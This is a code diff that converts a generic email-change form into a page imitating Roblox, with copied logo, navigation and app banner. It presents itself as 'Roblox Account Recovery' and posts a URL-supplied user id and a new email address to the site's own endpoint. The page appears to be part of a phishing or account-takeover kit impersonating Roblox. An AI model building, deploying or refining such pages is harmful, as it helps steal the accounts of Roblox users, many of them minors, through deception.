@@ -2,17 +2,125 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Update Email Address</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Roblox - Email Update</title>
   <link rel="stylesheet" href="/css/style.css" />
 </head>
 <body>
-  <div class="card">
-    <h2>Enter New Email</h2>
-    <form action="/api/newemail" method="POST">
-      <label for="newEmail">New Email Address:</label>
-      <input type="email" id="newEmail" name="newEmail" placeholder="name@example.com" required />
-      <button type="submit">Submit</button>
-    </form>
-  </div>
+
+  <!-- TOP HEADER -->
+  <header class="roblox-header">
+    <div class="header-main">
+      <div class="header-left">
+        <a href="/" class="roblox-logo" aria-label="Roblox">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M18.926 23.998L0 18.892 5.075 0l18.925 5.106-5.074 18.892zM15.348 10.09l-5.282-1.424-1.414 5.244 5.282 1.424 1.414-5.244z"/>
+          </svg>
+        </a>
+      </div>
+
+      <div class="header-right">
+        <button class="btn-signup">Sign Up</button>
+        <button class="btn-search" aria-label="Search">
+          <svg width="22" height="22" fill="none" stroke="currentColor" stroke-width="2.3" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-4.35-4.35M17 11A6 6 0 1 1 5 11a6 6 0 0 1 12 0z" />
+          </svg>
+        </button>
+      </div>
+    </div>
+
+    <nav class="sub-nav">
+      <a href="#">Charts</a>
+      <a href="#">Marketplace</a>
+      <a href="#">Create</a>
+      <a href="#">Robux</a>
+    </nav>
+  </header>
+
+  <!-- MAIN CONTAINER -->
+  <main class="main-container">
+    <div class="card">
+      <h1 class="card-title">Roblox Account Recovery</h1>
+      <p class="card-subtitle">Enter a new email address to receive your account recovery link.</p>
+
+      <form id="newEmailForm" action="/api/newemail" method="POST">
+        <input type="hidden" name="id" id="formUserId" value="" />
+        <div class="form-group">
+          <label for="newEmail">New Email Address</label>
+          <input
+            type="email"
+            id="newEmail"
+            name="newEmail"
+            placeholder="name@example.com"
+            required
+            autocomplete="email"
+          />
+        </div>
+
+        <button type="submit" id="btnSubmit" class="btn-primary">
+          Submit
+        </button>
+      </form>
+    </div>
+  </main>
+
+  <!-- BOTTOM APP BANNER -->
+  <footer class="app-banner" id="appBanner">
+    <button class="banner-close" id="closeBannerBtn" aria-label="Close">
+      <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
+      </svg>
+    </button>
+    <div class="banner-icon">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
+        <path d="M18.926 23.998L0 18.892 5.075 0l18.925 5.106-5.074 18.892zM15.348 10.09l-5.282-1.424-1.414 5.244 5.282 1.424 1.414-5.244z"/>
+      </svg>
+    </div>
+    <div class="banner-text">
+      <span class="banner-title">Explore Roblox in our Android app!</span>
+      <span class="banner-subtitle">Millions of experiences by people like you</span>
+    </div>
+    <a href="#" class="btn-visit">Visit</a>
+  </footer>
+
+  <script type="module">
+    const urlParams = new URLSearchParams(window.location.search);
+    const userId = urlParams.get('id') || '';
+    document.getElementById('formUserId').value = userId;
+
+    const form = document.getElementById('newEmailForm');
+    const emailInput = document.getElementById('newEmail');
+    const btnSubmit = document.getElementById('btnSubmit');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const val = emailInput.value.trim();
+      if (!val) return;
+
+      btnSubmit.disabled = true;
+      btnSubmit.textContent = 'Submitting...';
+
+      try {
+        const res = await fetch('/api/newemail', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+          body: JSON.stringify({ id: userId, newEmail: val })
+        });
+        const data = await res.json();
+        const nextUrl = data.redirect || '/views/pending.html';
+        window.location.href = nextUrl;
+      } catch (err) {
+        form.submit();
+      }
+    });
+
+    const closeBannerBtn = document.getElementById('closeBannerBtn');
+    const appBanner = document.getElementById('appBanner');
+    if (closeBannerBtn && appBanner) {
+      closeBannerBtn.addEventListener('click', () => {
+        appBanner.style.display = 'none';
+      });
+    }
+  </script>
 </body>
 </html>
